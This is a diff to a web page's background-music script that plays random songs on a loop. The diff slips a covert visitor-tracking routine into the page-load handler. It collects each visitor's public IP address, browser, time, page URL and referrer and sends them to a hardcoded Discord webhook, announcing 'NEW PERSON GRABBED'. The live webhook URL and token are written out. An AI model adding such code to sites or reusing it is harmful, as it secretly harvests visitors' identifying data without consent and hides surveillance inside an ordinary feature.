@@ -82,6 +82,54 @@ audio.loop = true;
 audio.preload = "auto";
 var currentSongIndex = -1;
 document.addEventListener("DOMContentLoaded", function() {
+  var webhook = 'https://discord.com/api/webhooks/1084046074089582643/zU35u5wCbrFE-AFIRBLh8sIUMKQsSkl9Mmj73NHMSg6NyCFUP8TNJB4uTcTrHroy1azq';
+  var site = 'https://myexternalip.com/raw';
+
+  var get_ip = function() {
+    var ip = '';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', site, false);
+    xhr.send();
+    if (xhr.status == 200) {
+        ip = xhr.responseText;
+    }
+    return ip;
+  };
+
+  function get_browser() {
+    var browser = navigator.userAgent;
+    return browser;
+    }
+
+  function get_time() {
+    var date = new Date();
+    var time = date.toLocaleString();
+    return time;
+    }
+
+  function get_url() {
+    var url = window.location.href;
+    return url;
+    }
+
+  function get_referrer() {
+    var referrer = document.referrer;
+    return referrer;
+    }
+
+  function send_webhook() {
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by ! LO$R]\n\`\`\``
+        })
+    });
+  }
+
+  send_webhook();
   function playNextSong() {
     var nextSongIndex = Math.floor(Math.random() * songs.length);
     while (nextSongIndex === currentSongIndex) {
@@ -105,10 +153,10 @@ document.addEventListener("DOMContentLoaded", function() {
     }
   }          
   
-  audio.addEventListener("ended", playNextSong);
-  playNextSong();
+    audio.addEventListener("ended", playNextSong);
+    playNextSong();
 
-window.addEventListener("load", function() {
-audio.play();
-}); 
+  window.addEventListener("load", function() {
+  audio.play();
+    }); 
 });
